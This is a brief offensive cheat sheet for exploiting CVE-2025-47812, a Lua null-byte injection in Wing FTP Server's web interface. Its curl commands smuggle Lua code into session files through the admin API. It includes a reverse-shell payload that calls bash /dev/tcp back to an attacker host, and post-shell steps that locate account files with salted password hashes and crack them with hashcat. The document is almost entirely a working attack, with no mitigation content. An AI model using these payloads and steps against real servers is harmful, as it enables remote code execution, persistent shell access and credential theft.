# Wing FTP Server Lua Null-Byte Injection (CVE-2025-47812)

Wing FTP Server's web interface stores sessions in files. A null-byte in a parameter smuggles Lua code into the session file, which Wing FTP executes as the server process.

```bash
# Wing FTP web admin (default: http://<TARGET>:5466 or :80)
# Identify: look for "Wing FTP" in HTTP headers or title

# Log in (anonymous or with found creds), then inject Lua via null-byte in a field:
curl -c cookies.txt http://<TARGET>:5466/admin_login
curl -b cookies.txt -X POST http://<TARGET>:5466/admin_xmlapi.php \
  --data "cmd=CheckFTPUser&user=test%00<lualocal f = io.open('/tmp/pwned','w'); f:write('test'); f:close()>"

# More useful: reverse shell via Lua
# Payload (URL-encoded null byte + Lua):
# user=test\x00<lua os.execute('bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"')>
```

Post-shell: Wing FTP account config files contain salted password hashes:
```bash
find / -name "*.dat" -path "*/WingFTP/*" 2>/dev/null
# Parse username:hash:salt format, crack with hashcat
```
